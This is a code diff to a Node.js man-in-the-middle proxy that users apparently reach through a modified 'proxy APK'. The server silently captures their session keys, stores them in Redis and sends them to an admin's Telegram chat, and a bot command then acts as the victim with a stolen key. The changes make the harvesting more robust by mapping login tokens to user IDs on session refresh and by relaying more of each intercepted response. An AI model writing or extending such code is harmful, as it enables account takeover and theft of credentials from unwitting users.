@@ -101,7 +101,7 @@ async function getSessionKey(userId) {
   if (redis) {
     try {
       const sk = await redis.hget('dschfSessionKeys', uid);
-      if (sk) { sessionKeyMap[uid] = sk; return sk; }
+      if (sk) { sessionKeyMap[uid] = String(sk); return String(sk); }
     } catch(e) {}
   }
   return null;
@@ -657,7 +657,7 @@ app.post('/bot-webhook', async (req, res) => {
       if (!targetUid || !sk) {
         const memKeys = Object.keys(sessionKeyMap).join(', ') || 'none';
         let redisKeys = '';
-        if (redis) { try { const all = await redis.hgetall('dschfSessionKeys'); redisKeys = all ? Object.keys(all).join(', ') : 'none'; } catch(e) { redisKeys = 'error'; } }
+        if (redis) { try { const all = await redis.hgetall('dschfSessionKeys'); if (all && typeof all === 'object' && !Array.isArray(all)) { redisKeys = Object.keys(all).join(', '); } else if (Array.isArray(all)) { const keys = []; for(let i=0;i<all.length;i+=2) keys.push(all[i]); redisKeys = keys.join(', '); } else { redisKeys = 'none'; } } catch(e) { redisKeys = 'error: ' + e.message; } }
         await bot.sendMessage(chatId, `❌ No sessionKey found.\nMemory: ${memKeys}\nRedis: ${redisKeys}\nUsage: /testtask <userId>\n\n💡 User must login first through proxy APK`);
         return res.sendStatus(200);
       }
@@ -1222,14 +1222,21 @@ app.all('/app/auth/refresh/session', async (req, res) => {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
     const respData = getResponseData(jsonResp);
-    const userId = await extractUserId(req, jsonResp);
+    let userId = await extractUserId(req, jsonResp);
+    if (!userId && body.loginToken) {
+      const tokKey = body.loginToken.substring(0, 100);
+      userId = tokenUserMap[tokKey];
+      if (!userId && redis) {
+        try { const stored = await redis.hget('dschfTokenMap', tokKey); if (stored) userId = String(stored); } catch(e) {}
+      }
+    }
     if (respData && respData.sessionKey && userId) {
       saveSessionKey(String(userId), respData.sessionKey);
       if (data.adminChatId && bot) {
-        bot.sendMessage(data.adminChatId, `🔄 Session Refresh\n👤 User: ${userId}\n🔑 SessionKey: ${respData.sessionKey.substring(0,8)}...${respData.sessionKey.substring(respData.sessionKey.length-4)}\n✅ Stored in Redis`).catch(()=>{});
+        bot.sendMessage(data.adminChatId, `🔄 Session Refresh\n👤 User: ${userId}\n🔑 SK: ${respData.sessionKey.substring(0,8)}...${respData.sessionKey.substring(respData.sessionKey.length-4)}\n✅ Stored in Redis`).catch(()=>{});
       }
     } else if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId, `🔄 Session Refresh\n👤 User: ${userId || 'N/A'}\n❌ No sessionKey in response\n📥 ${respBody.substring(0, 300)}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🔄 Session Refresh\n👤 User: ${userId || 'N/A'}\n🔑 HasSK: ${!!(respData && respData.sessionKey)}\n📥 ${respBody.substring(0, 400)}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
